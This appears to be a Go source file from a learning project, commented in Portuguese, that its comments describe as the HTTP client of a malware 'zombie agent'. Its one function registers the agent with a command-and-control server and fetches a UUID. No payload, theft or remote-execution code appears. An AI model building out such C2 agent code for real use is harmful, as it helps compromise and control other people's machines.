package agenthttp

import (
	"bytes"
	"encoding/json"
	"errors"
	"net/http"
	"time"
)

// AgentHTTP é o módulo cliente do nosso Malware
type AgentHTTP struct {
	serverURL  string
	httpClient *http.Client
}

// NewAgentHTTP cria uma nova instância do Agente zumbi
func NewAgentHTTP(serverURL string) *AgentHTTP {
	return &AgentHTTP{
		serverURL: serverURL,
		// Regra de Ouro: Sempre usar timeout para evitar que o malware trave a thread!
		httpClient: &http.Client{Timeout: 10 * time.Second},
	}
}

// RequestAnUUIDToMe bate na porta do C&C pedindo uma identidade
func (a *AgentHTTP) RequestAnUUIDToMe() (string, error) {
	// 1. Monta a URL da rota que já construímos no Servidor
	url := a.serverURL + "/api/agents"

	// 2. Prepara a requisição POST (o corpo pode ser vazio)
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewBuffer([]byte{}))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// 3. O Agente executa o disparo para a rede
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// 4. Se o servidor não responder com 201 Created (ou 200 OK), algo deu errado
	if resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusOK {
		return "", errors.New("falha ao registrar o agente no C&C, status: " + resp.Status)
	}

	// 5. Lemos a resposta JSON enviada pelo nosso C&C
	var result map[string]string
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", err
	}

	// 6. Extraímos o UUID gerado
	uuid, ok := result["uuid"]
	if !ok {
		return "", errors.New("o C&C não retornou um UUID válido")
	}

	return uuid, nil
}